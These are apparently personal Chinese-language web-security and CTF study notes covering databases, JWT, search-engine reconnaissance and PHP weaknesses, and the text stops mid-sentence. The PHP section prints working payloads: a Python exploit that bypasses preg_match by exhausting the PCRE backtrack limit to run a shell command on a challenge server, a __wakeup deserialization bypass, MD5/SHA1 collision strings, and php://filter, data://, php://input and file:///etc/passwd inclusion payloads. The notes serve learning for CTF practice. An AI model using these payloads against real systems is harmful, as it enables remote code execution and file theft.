数据库广泛用于服务器，用来存储大量的数据并进行读取等操作，目前市面上数据库类型种类繁多，有关系型数据库和非关系型数据库之分，目前最为常见的数据库是MySQL，因为其开源和免费而受到众多开发者的支持。  但是MySQL在处理超巨量型数据时十分力不从心，专业型数据库Oracle解决了这个问题，成为企业的数据库解决方案，此外还有Microsoft的SQL Sever和Access，非关系型数据库MongoDB，以存储键值高效而持续闻名的redis。  不同的数据库在服务端用处也不一致，但他们基本都使用同一的SQL语言进行数据库操作，这使得数据库的学习成本降低。  MySQL+php是常见的前端组合，它们被广泛用于中小型论坛、博客或其他网站，开发成本低。  一般服务器中不适用Access作为数据库存储。  redis常用来存储需要反复读取的信息，如session信息。redis可以被用来提权，以此来获得服务器的root权限。  SQL语句大全  （八）正则表达式                 [正则表达式 – 语法       菜鸟教程 (runoob.com)](https://www.runoob.com/regexp/regexp-syntax.html)           如何教你看懂复杂的正则表达式 - superstar - 博客园 (cnblogs.com)  （九）url编码  小tips  %A0表示NBSP（U + 00A0）。* +表示普通空格（U + 0020）。 NBSP显示为替换字符（U + FFFD）  （十）LDAP  全称是Lightweight Directory Access Protocol，轻量目录访问协议。顾名思义，LDAP是设计用来访问目录数据库的一个协议。协议就是标准，并且是抽象的。在这套标准下，AD（Active Directory）是微软的对目录服务数据库的实现。目录服务数据库也是一种数据库，这种数据库相对于我们熟知的关系型数据库（比如MySQL,Oracle）。  （十一）token  1、Token的引入：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。  2、Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。  3、使用Token的目的：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。  有很多token的具体实现。  JSON 网络令牌 - jwt.io  通俗地说，JWT的本质就是一个字符串，它是将用户信息保存到一个Json字符串中，然后进行编码后得到一个JWT token，并且这个JWT token带有签名信息，接收后可以校验是否被篡改，所以可以用于在各方之间安全地将信息作为Json对象传输。JWT的认证流程如下：  首先，前端通过Web表单将自己的用户名和密码发送到后端的接口，这个过程一般是一个POST请求。建议的方式是通过SSL加密的传输(HTTPS)，从而避免敏感信息被嗅探。  后端核对用户名和密码成功后，将包含用户信息的数据作为JWT的Payload，将其与JWT Header分别进行Base64编码拼接后签名，形成一个JWT Token，形成的JWT Token就是一个如同lll.zzz.xxx的字符串。  后端将JWT Token字符串作为登录成功的结果返回给前端。前端可以将返回的结果保存在浏览器中，退出登录时删除保存的JWT Token即可。  前端在每次请求时将JWT Token放入HTTP请求头中的Authorization属性中(解决XSS和XSRF问题) 后端检查前端传过来的JWT Token，验证其有效性，比如检查签名是否正确、是否过期、token的接收方是否是自己等等。  验证通过后，后端解析出JWT Token中包含的用户信息，进行其他逻辑操作(一般是根据用户信息得到权限等)，返回结果。   JWT详解_baobao555#的博客-CSDN博客_jwt  JWT需要加密算法，因而对其加密算法的反寻找很重要，这个github项目提供了这个需求的实现方法。  git clone https://github.com/brendan-rius/c-jwt-cracker.git   二、渗透测试信息收集  （一）收集域名信息  whois查询  whois（读作“Who is”，非缩写）是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令列接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令列接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。  在kali环境下使用whois 域名就可以查询到域名的基本信息  工信部备案查询  在我国，所有运营的网站都需要在工信部备案，可以通过工信部官网查询。  ICP备案查询 - 站长工具 (chinaz.com)  （二）收集敏感信息  搜索引擎查询  搜索引擎基于网络爬虫技术，巧妙地运营搜索引擎构造查询语句可以得到想要的信息。     搜索引擎语法 使用搜索引擎搜索的时候，可以使用特定的语法来筛选搜索结果，达到精准搜索的目的。         +（加号） 搜索结果要求包含两个及两个以上关键字。       【用法】：关键词    【示例】：疑犯追踪+资源    【说明】：相当于空格和AND         -（减号） 排除特定关键词。       【用法】：关键词 空格 - 关键词    【示例】：考研 -推广 -推广链接    【注意】：百度有些关键词用减号没用         ” “(双引号) 完全搜索匹配，搜索结果必须包括双引号中出现的所有词，连顺序也要保持一致，可用来搜索完整句子。       【用法】：“关键词”    【示例】：“疑犯追踪资源”         OR 搜索结果至少包含多个关键词中的任意一个。       【用法】：关键词1 空格 OR 空格 关键词2    【示例】：疑犯追踪 OR Person of Interest    【注意】：OR要大写         intitle 检索标题中含有关键词的网页。       【用法】：关键词 空格 intitle:需要限定的关键词    【示例】：疑犯追踪 intitle:资源         inurl 检索url中包含关键词的网页。       【用法】：inurl:关键词    【示例】：inurl:pan.baidu.com         intext 检索某个正文中含有关键词的网页。       【用法】：intext:关键词    【示例】：intext:“后台登陆”         site 搜索范围限定在特定的站点中。       【用法】：关键词 空格 site:搜索范围所限定的站点    【示例】：疑犯追踪 site:tieba.baidu.com    【注意】：站点前不用加www或http         filetype 限定搜索文件类型。       【用法】：关键词 空格 filetype:文件格式    【示例】：疑犯追踪 filetype:pdf    【注意】：filetype为mp3、mp4、jpg、png时，无搜索结果         时间1…时间2 搜索特定时间范围内的关键词信息。       【用法】：关键词 空格 时间1…时间2    【示例】：疑犯追踪 2016…2018         link 检索指定域名的网页。       【用法】：link:网址    【示例】：link:pan.baidu.com    【说明】：将返回所有包含pan.baidu.com关键词的网页         related 检索相似类型的网页，用来搜索结构内容方面相似的网页。       【用法】：related:网址    【示例】：related:www.google.com    【说明】：将返回和www.google.com相似的页面，指网页布局相似。         cache 仅google有效，从google服务器上缓存页面中查询信息，可查询网页快照。       【用法】：cache:网址    【示例】：cache:www.google.com         info 用来显示与查询链接相关的一系列搜索结果。       【用法】：info:网址    【示例】：info:www.google.com         index of 搜索允许目录浏览的网页。       【用法】index of 空格 关键词    【示例】index of /admin    搜索语法可组合使用。   http抓包查询  可以观察网页发来的http响应获得一定的信息。  wappalyzer  这是一款可以鉴定网站使用了那些服务的工具，可以识别搭建网站的服务器、解释器、渲染模板、CMS等。  三、前端语言与前端注入  （一）html  （二）css  CSS实现键盘监听  GitHub - maxchehab/CSS-Keylogging: Chrome extension and Express server that exploits keylogging abilities of CSS.  （三）JavaScript  JavaScript是一种脚本语言，越来越广泛的用于网页的开发，由于其本地执行性，js会被传到本地执行，因此可以通过本地分析js代码获取一些信息。  （四）xml  （五）XSS注入  四、后端语言漏洞与绕过  （一）php  魔术方法  魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。 问题就出现在重载过程中，执行了相关代码。  1、__get、__set  这两个方法是为在类和他们的父类中没有声明的属性而设计的  __get( $property ) 当调用一个未定义的属性时访问此方法  __set( $property, $value ) 给一个未定义的属性赋值时调用  这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）  2、__isset、__unset  __isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法  __unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法  与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）  3、__call  __call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法  4、__autoload  __autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。  注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。  5、__construct、__destruct  __construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称  __destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法  默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用.  在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。  6、__clone  PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。  7、__toString  __toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。  在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）  从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。  8、__sleep、__wakeup  __sleep 串行化的时候用  __wakeup 反串行化的时候调用  serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。  使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。  相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。  9、__set_state  当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =&gt; value, …)格式排列的类属性。  10、__invoke  当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效  11、__callStatic  它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。  同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。   函数绕过  1、preg_match()  preg_match($pattern,$subject [, &amp;$matches [, $flags = 0 [, $offset = 0 ]]]);      $pattern：要搜索的模式，也就是编辑好的正则表达式； $subject：要搜索的字符串； $matches：可选参数（数组类型），如果提供了 $matches，它将被填充为搜索结果。 $matches[0] 包含完整模式匹配到的文本， $matches[1] 包含第一个捕获子组匹配到的文本，以此类推； flags：可选参数，flags 可以被设置为 PREG_OFFSET_CAPTURE，如果传递了这个标记，对于每一个出现的匹配，返回时都会附加上字符串偏移量（相对于目标字符串的）； $offset：可选参数，用于指定从目标字符串的哪个位置开始搜索（单位是字节）。   绕过原理：pcre.backtrack_limit  php为了防止DDoS攻击设计了访问上限，一般来说默认的访问限制次数是十万到一百万，只要提交的字符串在匹配函数的调用过程中，函数回溯超过这个上限，那么函数自动返回false来结束运行。  下面是一个例子（[NISACTF 2022]middlerce）：  &lt;?php include \"check.php\"; if (isset($_REQUEST['letter'])){     $txw4ever = $_REQUEST['letter'];     if (preg_match('/^.*([\\w]|\\^|\\*|\\(|\\~|\\`|\\?|\\/| |\\||\\&amp;|!|\\&lt;|\\&gt;|\\{|\\x09|\\x0a|\\[).*$/m',$txw4ever)){         die(\"再加把油喔\");     }     else{         $command = json_decode($txw4ever,true)['cmd'];         checkdata($command);         @eval($command);     } } else{     highlight_file(__FILE__); } ?&gt;   php源码中显示了关键的正则表达式，我们通过构造多个$来强迫其返回false，构造的exp如下：  import threading import requests payload = '{\"cmd\":\"?&gt;&lt;?= `tail /f*`?&gt;\", \"$\":\"' + \"$\"*(1000000) + '\"}' res = requests.post(\"http://1.14.71.254:28159/\",data = {\"letter\":payload}) print(res.text)   此外，还可以通过url编码取反的方式绕过  &lt;?php echo urlencode(~(\"phpinfo();\")); ?&gt;   之后可以在传入参数的时候进行取反，两次相同的取反结果一致，由于php的动态执行，字符串先以不可读的url编码形式与perg_match进行匹配，然后当进入eval等危险函数时，便会先取反恢复可读性，然后再执行。  2、__wakeup()绕过  （CVE-2016-7124）  在被反序列化的过程中对象会触发其内部的__wakeup()函数，如果需要绕过，只需要修改序列化对象的参数列表使其参数个数与实际参数不同即可，如：  O:4:\"Test\":3:{s:7:\"Testa\";s:7:\"private\";s:1:\"b\";s:6:\"public\";s:4:\"*c\";s:9:\"protected\";}   为了绕过我们通常修改其为：  O:4:\"Test\":11:{s:7:\"Testa\";s:7:\"private\";s:1:\"b\";s:6:\"public\";s:4:\"*c\";s:9:\"protected\";}   3、加密函数（md5\\sha1）绕过  md5和sha1都是不可逆加密，目前没用有效的破解方法（除了暴力破解），php中经常使用md5()\\sha1()函数来进行加密判断。  根据php的特性，判断两个变量相等有==（弱相等），===（强相等），当出现弱相等比较时，如：  if(md5($_GET['in1']) == md5($_GET['in2'])){........}   我们可以采用两种绕过方法：  1.类型绕过  md5()或sha1()只能传入数字，所以当我们传入非数字变量时，函数会返回null，可以利用这个特点来传入数组以绕过，in1[]=0&amp;in2[]=1。  2.科学计数法绕过  MD5()会将0e开头的字符串直接识别成0，所以一些0e开头的字符串可以用于绕过，常见的0e开头的字符串有：     s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 240610708  0e462097431906509019562988736854 314282422  0e990995504821699494520356953734 571579406  0e972379832854295224118025748221 903251147  0e174510503823932942361353209384 1110242161  0e435874558488625891324861198103 1320830526  0e912095958985483346995414060832 1586264293  0e622743671155995737639662718498 2302756269  0e250566888497473798724426794462 2427435592  0e067696952328669732475498472343 2653531602  0e877487522341544758028810610885 3293867441  0e471001201303602543921144570260 3295421201  0e703870333002232681239618856220 3465814713  0e258631645650999664521705537122 3524854780  0e507419062489887827087815735195 3908336290  0e807624498959190415881248245271 4011627063  0e485805687034439905938362701775 4775635065  0e998212089946640967599450361168 4790555361  0e643442214660994430134492464512 5432453531  0e512318699085881630861890526097 5579679820  0e877622011730221803461740184915 5585393579  0e664357355382305805992765337023 6376552501  0e165886706997482187870215578015 7124129977  0e500007361044747804682122060876 7197546197  0e915188576072469101457315675502 7656486157  0e451569119711843337267091732412 QLTHNDT  0e405967825401955372549139051580 QNKCDZO  0e830400451993494058024219903391 EEIZDOI  0e782601363539291779881938479162 TUFEPMC  0e839407194569345277863905212547 UTIPEZQ  0e382098788231234954670291303879 UYXFLOI  0e552539585246568817348686838809 IHKFRNS  0e256160682445802696926137988570 PJNPDWY  0e291529052894702774557631701704 ABJIHVY  0e755264355178451322893275696586 DQWRASX  0e742373665639232907775599582643 DYAXWCA  0e424759758842488633464374063001 GEGHBXL  0e248776895502908863709684713578 GGHMVOE  0e362766013028313274586933780773 GZECLQZ  0e537612333747236407713628225676 NWWKITQ  0e763082070976038347657360817689 NOOPCJF  0e818888003657176127862245791911 MAUXXQC  0e478478466848439040434801845361 MMHUWUV  0e701732711630150438129209816536   当出现强类型等于时，可以使用数组绕过，但不能使用科学计数法绕过，  if(md5($_GET['in1']) === md5($_GET['in2'])){........}   此时我们考虑用MD5碰撞，MD5碰撞技术可以根据一个前缀生成两个md5值相等但本身不同的字符串值，一般我们使用工具fastcoll，但fastcoll生成的文件无法直接阅读，需要传入php环境进行url编码，所以有如下常用的碰撞结果：  常用的MD5碰撞  param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2   或  array1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2  &amp;array2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   常用的sha1碰撞  array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1          &amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1    注意：php8不支持数组绕过  4、is_numeric漏洞  会忽视0x这种十六进制的数  容易引发sql注入操作，暴漏敏感信息  echo json_encode([     is_numeric(233333),     is_numeric('233333'),     is_numeric(0x233333),     is_numeric('0x233333'),     is_numeric('233333abc'), ]);   结果如下  16进制数0x61646D696EASII码对应的值是admin  如果我们执行了后面这条命令的话：SELECT * FROM tp_user where username=0x61646D696E，结果不言而喻  [     true,     true,     true,     false,     false ]   5、in_array漏洞  in_array中是先将类型转为整形，再进行判断  转换的时候，如果将字符串转换为整形，从字符串非整形的地方截止转换，如果无法转换，将会返回0  &lt;?php var_dump(in_array(\"2%20and%20%\", [0,2,3]));   结果如下  bool(true)   6、switch漏洞  switch中是先将类型转为整形，再进行判断  转换的时候，如果将字符串转换为整形，从字符串非整形的地方截止转换，如果无法转换，将会返回0  &lt;?php $i =\"2abc\"; switch ($i) {     case 0:     case 1:     case 2:         echo \"i是比3小的数\";         break;     case 3:         echo \"i等于3\"; } 结果如下     i是比3小的数    7、文件包含与伪协议  在C/C++中我们利用#include&lt;&gt;来导入库，在java/python中我们利用import导入库，在php中，同样也有相似的操作include();和其衍生型。  对于include函数的不安全使用，可以使我们访问到服务器的一些原本不可见的地址。  include可以包含本地也可以包含远程，对于include函数的操作我们常用伪协议来读取需要的信息。  php://filter  php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。  简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。  php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。  协议参数                 名称       描述                       resource=       这个参数是必须的。它指定了你要筛选过滤的数据流。                 read=       该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。                 write=       该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。                 &lt;；两个链的筛选列表&gt;       任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或链。           常用：  php://filter/read=convert.base64-encode/resource=index.php php://filter/resource=index.php   利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。  而使用的convert.base64-encode，就是一种过滤器。  过滤器     字符串过滤器 该类通常以string开头，对每个字符都进行同样方式的处理。   string.rot13  一种字符处理方式，字符右移十三位。  string.toupper  将所有字符转换为大写。  string.tolower  将所有字符转换为小写。  string.strip_tags 这个过滤器就比较有意思，用来处理掉读入的所有标签，例如XML的等等。在绕过死亡exit大有用处。     转换过滤器 对数据流进行编码，通常用来读取文件源码。   convert.base64-encode &amp; convert.base64-decode  base64加密解密  convert.quoted-printable-encode &amp; convert.quoted-printable-decode  可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。  —– file_put_content和死亡·杂糅代码  data://  data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行  如  1、data://text/plain, http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;   2、data://text/plain;base64, http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b   例题（惨痛经历）[强网杯2022青少年组 web2]  第六届“强网杯”青少年专项赛  file://  用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响 file://协议主要用于访问文件(绝对路径、相对路径以及网络路径) 比如：http://www.xx.com?file=file:///etc/passsword  php://  在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用 php://作用为访问输入输出流  php://input  php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。  例如： http://127.0.0.1/cmd.php?cmd=php://input POST数据：&lt;?php phpinfo()?&gt; 注意： 当enctype=”multipart/form-data”的时候 php://input` 是无效的  遇到file_get_contents()要想到用php://input绕过。  zip://,bzip2://,zlib://,phar://  zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行  PHP巧用WebDAV绕过URL包含限制Getshell  8、$_SERVER[]利用                 数组元素       说明                       $_SERVER[‘PHP_SELF’]       当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://XXX.XXX.X. 的脚本中使用 $_SERVER[‘PHP_SELF’] 将得到 /test.php/foo.bar                 $_SERVER[‘SERVER_ADDR’]       当前运行脚本所在服务器的 IP 地址                 $_SERVER[‘SERVER_NAME’]       当前运行脚本所在服务器的主机名。如果脚本运行于虚拟主机中，该名称就由那个虚拟主机所设置的值决定                 $_SERVER[‘SERVER_PROTOCOL’]       请求页面时通信协议的名称和版本。例如，“HTTP/1.0”                 $_SERVER[‘REQUEST_METHOD’]       访问页面使用的请求方法。例如“GET”“HEAD”“POST”“PUT”                 $_SERVER[‘DOCUMENT_ROOT’]       当前运行脚本所在的文档根目录。在服务器配置文件中定义                 $_SERVER[‘HTTP_ACCEPT_LANGUAGE’]       当前请求头中 Accept-Language: 项的内容（如果存在）。例如，“en”                 $_SERVER[‘REMOVE_ADDR’]       浏览当前页面的用户 IP 地址，注意与 $_SERVER[‘SERVER_ADDR’] 的区别                 $_SERVER[‘SCRIPT_FILENAME’]       当前执行脚本的绝对路径                 $_SERVER[‘SCRIPT_NAME’]       包含当前脚本的路径                 $_SERVER[‘REQUEST_URI’]       URI 用来指定要访问的页面。例如，“index.html”                 $_SERVER[‘PATH_INFO’]       包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息（如果存在）。例如，当前脚本是通过 URL http://c.biancheng.net/php/path_info.php/some/stuff?foo=bar 被访问的，那么 $_SERVER[‘PATH_INFO’] 将包含 /some/stuff           反序列化漏洞  php通过serialize()对一些类的对象进行序列化，之后通过unserialize()进行反序列化，在对象的生命周期中会调用多种魔术方法，我们可以将恶意代码注入到对象中，利用对象的魔术方法执行恶意代码。  被序列化的对象可以有如下解读：  O:4:\"Test\":3:{s:7:\"Testa\";s:7:\"private\";s:1:\"b\";s:6:\"public\";s:4:\"*c\";s:9:\"protected\";}      第一部分：O:4:”Test”:3: O  表示一个对象 object 4　 对象名称的长度为4 Test 对象的名称 3　 对象有3个属性（变量） 第二部分：{s:7:”Testa”;s:7:”private”;s:1:”b”;s:6:”public”;s:4:”c”;s:9:”protected”;} s:7:”Testa”;s:7:”private”; s 变量名字符串string 7 变量名的长度为7　　/x00Test/x00a s 变量值字符串string 7 变量值的长度 private 变量值的内容 s:1:”b”;s:6:”public”; 相同的解释 s:4:”*c”;s:9:”protected”; 4 变量名的长度为4　　/x00/x00c   可以见到，序列化后的对象自带一定的参数，只要我们知道了对象的类组成，就可以在原来代码的基础上重新构建代码做到对象属性的修改。由于面向对象的多态性，只要符合原来类的属性与方法的对象，都是正确的。  特别地，有一些反序列化中常用的技巧——  利用原生类  当没有提供给我们使用的类时，可以考虑利用原生类进行恶意操作。顾名思义，原生类默认在所有php中被继承，所以可以轻松使用这些原生类构造恶意对象。  -DirectoryIterator类  DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。  DirectoryIterator 类会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名：  例如：  &lt;?php $dir=new DirectoryIterator(\"/\"); echo $dir;   这个查不出来什么，如果想输出全部的文件名我们还需要对$dir对象进行遍历：  &lt;?php $dir=new DirectoryIterator(\"/\"); foreach($dir as $tmp){     echo($tmp.'\\&lt;br&gt;');     //echo($tmp-&gt;toString().'\\&lt;br&gt;); //与上句效果一样 }   代码里两个语句一样,这也印证了之前说的echo触发了Directorylterator 中的toString()方法 。  我们也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：  &lt;?php $dir=new DirectoryIterator(\"glob:///*php*\"); echo $dir;   也可以通过目录穿越，确定我们已知的文件的具体路径：  &lt;?php $dir=new DirectoryIterator(\"glob://./././flag.txt\");  //目录穿越 echo $dir;   -FilesystemIterator 类 FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。  该类的使用方法与DirectoryIterator 类也是基本相同的：(子类与父类的关系)  &lt;?php $dir=new FilesystemIterator(\"/\"); echo $dir;   &lt;?php $dir=new FilesystemIterator(\"/\"); foreach($dir as $tmp){     echo($tmp.'&lt;br&gt;');     //echo($f-&gt;__toString().'&lt;br&gt;'); }   小发现：经 php_study 测试发现，如果123.php文件在D://phpstudy_Pro/WWW/ 下。我们可用于确定路径的文件也必须在其中，如D:// 或 D://phpstudy_Pro 或 D://php_study_Pro/WWW 。  -GlobIterator 类 GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()函数，可以通过模式匹配来寻找文件路径。使用这个类不需要额外写上glob://  还有：  Directorylterator类 与 FilesystemIterator 类当我们使用echo函数输出的时候，会触发这两个类中的 __toString() 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的。而GlobIterator 类在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如：例题里我们知道了flag的文件名特征为 